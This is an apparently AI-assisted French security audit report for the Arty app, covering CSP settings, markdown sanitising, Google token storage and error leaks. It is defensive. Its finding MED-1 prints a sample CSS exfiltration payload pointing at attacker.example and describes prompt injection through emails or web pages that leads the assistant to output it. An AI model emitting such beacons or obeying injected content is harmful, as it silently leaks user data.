# 🔒 Audit sécurité Arty — 6 juillet 2026

Audit mensuel de routine (`/audit-secu`), 3 agents Explore en parallèle
(backend Opus, crypto+auth Opus, frontend+Capacitor Sonnet — conforme
RÈGLE 7), suivi d'une vérification directe (Read/Grep) de chaque claim
avant classement. Périmètre : tout `functions/api/`, toute la chaîne
crypto/auth Google client+serveur+Android, tout le frontend + Capacitor.

## ✅ Ce qui va bien

- **Aucun CRIT, aucun HIGH actif** trouvé sur l'ensemble des 3 périmètres.
- Les durcissements des audits précédents (3-5 juillet 2026, PRs #307,
  #309-#316) tiennent tous : validation regex des IDs, `aud`/`azp` sur
  les endpoints qui dépensent la clé owner, cap premium atomique,
  expiration d'abonnement en SQL, timeouts Google, PKCE S256, allowlist
  HITL sur les boutons d'action, sanitize markdown durci, permissions
  Android/iOS conformes, Service Worker conditionnel, pas de sourcemaps
  en prod, pas de clé IA payante en `VITE_`.
- IDOR : identité systématiquement dérivée du token vérifié, jamais du
  body/query côté client.
- Webhooks (LemonSqueezy/Creem) : HMAC constant-time, idempotence,
  montants figés côté serveur.

## 🔴 CRIT actifs

Aucun.

## 🟠 HIGH actifs

Aucun.

## 🟡 MED

### MED-1 — Exfiltration CSS possible via `style` en wildcard + `img-src https:` trop permissif
**Fichiers** : `src/components/shared/MarkdownRenderer.tsx:52-73`, `public/_headers:6`
**Confirmé sur le terrain** : `style` est autorisé sur tous les tags
(`'*': [..., 'style']` + repris explicitement sur `div`/`span`), et
`hast-util-sanitize` ne valide pas la *valeur* CSS (pas de blocage de
`url(...)`). Combiné à `img-src 'self' data: https:` (n'importe quel
hôte HTTPS), un contenu markdown contenant un `<div style="background:
url(https://attacker.example/beacon?x=...)">` — via prompt-injection
dans un email/page web qu'Arty lit et reproduit — déclenche un
chargement d'image vers un domaine arbitraire **sans clic utilisateur**.
Canal d'exfiltration passif classique (CSS exfil).
**Fix suggéré** : retirer `style` de l'allowlist globale `'*'` (aucun
usage documenté ne le justifie dans les composants actuels) ; resserrer
`img-src` aux hôtes réellement utilisés au lieu de `https:` générique.
Effort : ~15 min + test de non-régression markdown.

### MED-2 — CSP `connect-src` ne couvre pas `api.openai.com` (BYOK ChatGPT/Whisper cassés sur web)
**Fichiers** : `public/_headers:6`, `src/services/openaiClient.ts`, `src/services/whisperClient.ts`
**Confirmé** : `openaiClient.ts`/`whisperClient.ts` appellent
`https://api.openai.com` directement depuis le navigateur en BYOK,
comme Anthropic/Mistral (qui sont dans `connect-src`), mais
`api.openai.com` est absent de la liste → bloqué par CSP sur
`tryarty.com` (PWA web). Le natif n'a pas de CSP meta-tag, donc n'est
pas affecté. Pas une faille — une régression fonctionnelle silencieuse
du même type que BUG 40.
**Fix suggéré** : ajouter `https://api.openai.com` à `connect-src` dans
`public/_headers`. Effort : 1 ligne.

### MED-3 (accepté, tracé) — Chemin natif d'onboarding contourne `storeTokens()`
**Fichier** : `src/App.tsx:949-955` (`onNativeGoogleLogin`)
**Confirmé** : écrit `google-tokens`/`google-user` en clair via
`setJSON` direct au lieu du chemin canonique `storeTokens()`/`storeUser()`.
Conséquences : fenêtre transitoire où le `refresh_token` (credential
long-vécu, accès Gmail/Drive/Calendar) reste en JSON clair jusqu'au
prochain `bootstrapGoogleStorage()` ; logique d'échange dupliquée sans
timeout ni préservation du refresh_token existant (inoffensif ici car
1er login, mais fragile si dupliqué ailleurs).
**Fix suggéré** : remplacer les deux `setJSON` par
`storeTokens()`/`storeUser()`, ou router ce chemin vers `exchangeCode()`
existant. Effort : ~30 min, code déjà écrit ailleurs.

## 🟢 LOW

- **`trial/init.ts:54`** — copie locale de `verifyTokenViaTokeninfo` avec
  le court-circuit `&& info.aud` que le fix canonique (M-3,
  `checkAllowedUser.ts`) a retiré. Un token sans `aud` ni `azp` passerait
  la garde ici (exploitabilité quasi nulle, aucun accès clé owner direct
  — les proxys revalident `aud` séparément). Fix : importer la version
  canonique au lieu de la dupliquer.
- **7 endpoints renvoient `err.message` brut au client** dans leur catch
  d'exception (`gemini-proxy.ts`, `openai-proxy.ts`, `mistral-proxy.ts`,
  `tts.ts`, `voxtral-proxy.ts`, `whisper-proxy.ts`, `computer/relay.ts`) —
  incohérent avec `ai/proxy.ts` (Anthropic) déjà durci en générique. Leak
  mineur (exceptions internes bénignes type "fetch failed", pas le body
  upstream déjà masqué séparément). Fix : aligner sur le pattern
  `proxy.ts` (log serveur + `{error: 'Proxy error'}` générique).
- **Clés crypto globales non scopées par user** (`crypto.ts:14-16`,
  `SALT_KEY`/`KEY_CHECK_KEY`/`VERSION_KEY`) — edge-case multi-comptes
  avec BYOK mixte sur le même appareil, dégrade en re-login (pas de
  fuite). Déjà englobé par le chantier IndexedDB `CryptoKey`
  non-extractible (voir TODO).
- **Dérive d'étiquettes BUG dans les commentaires** (`googleAuth.ts:194,245,255`
  citent BUG 49/48 au lieu de BUG 51/47) — cosmétique, risque de
  confusion au prochain audit.

## Faux positifs / déjà mitigé

- Chemins peek `search/web`, `fetch/url`, `geo`, `weather`, `quota` :
  validation `aud` bien couverte via `checkAllowedUserPeek` +
  `GOOGLE_CLIENT_ID` (N-1/PR #309) — pas un trou.
- `license/activate.ts` sans token Google : MED accepté et documenté
  (Pro=BYOK PR #287 limite l'impact), pas un nouveau finding.
- IDs produits Creem en mode TEST : connu, fail-closed, à traiter au
  go-live commercial (F-33), pas une faille.
- Rate-limit absent sur `/api/auth/token` : LOW déjà différé
  volontairement (C13) pour éviter un lockout IP partagée.

## Plan d'action

**Priorité 1 (cette semaine, ~1h total)** :
1. MED-2 — ajouter `api.openai.com` à `connect-src` (1 ligne, corrige un
   bug fonctionnel visible pour les users BYOK OpenAI sur web).
2. MED-1 — retirer `style` du wildcard `'*'` + resserrer `img-src`
   (15 min + test markdown).

**Priorité 2 (ce sprint, ~1h)** :
3. MED-3 — router `onNativeGoogleLogin` vers `storeTokens()`/`exchangeCode()`.
4. LOW — dédupliquer `verifyTokenViaTokeninfo` dans `trial/init.ts`.
5. LOW — généraliser le masquage d'erreur générique aux 7 endpoints
   restants (pattern déjà écrit dans `ai/proxy.ts`).

**Priorité 3 (différé, gros chantier déjà tracé)** :
- Chantier `CryptoKey` non-extractible (F-34/C6) — résout à la fois le
  sel global et la clé dérivée de constante publique. Le plus gros
  reliquat sécu du projet, priorité déjà rehaussée le 5 juillet.
- Go-live Creem (IDs produits test → prod).

---

## 🙋 Résumé en mots simples

**Le verdict court : rien de grave, l'app est saine.** Aucun trou de
sécurité critique ou majeur n'a été trouvé — pas de faille qui permettrait
à quelqu'un de voler des données, de pirater un compte, ou d'utiliser Arty
gratuitement aux frais du propriétaire.

On a trouvé **2 petits problèmes à corriger vite** (moins d'une heure de
travail au total) :

1. **Un risque théorique de "mouchard" caché dans les réponses de l'IA.**
   Si un jour un email ou une page web piégée arrivait à faire dire à
   l'IA du texte contenant un bout de code caché, ce code pourrait
   discrètement "appeler à la maison" un site externe sans que
   l'utilisateur clique sur rien — un peu comme un pixel espion dans un
   email marketing. Ça n'a jamais été exploité, c'est une porte qu'on
   ferme par précaution.
2. **Un bug qui casse une fonctionnalité (pas un risque de sécurité)** :
   les gens qui utilisent leur propre clé OpenAI (ChatGPT) sur le site
   web (pas l'appli mobile) ne peuvent probablement plus s'en servir à
   cause d'une règle de sécurité du navigateur mal réglée. Une ligne à
   corriger.

Un troisième point plus mineur : au tout premier login Google sur mobile,
les identifiants de connexion restent une fraction de seconde "en clair"
au lieu d'être immédiatement chiffrés — une fenêtre très courte et peu
exploitable en pratique, mais qu'on préfère refermer proprement.

Tout le reste (mots de passe, clés API, permissions de l'appli, connexion
Google, protection contre les attaques classiques) a été vérifié ligne
par ligne et est en ordre.
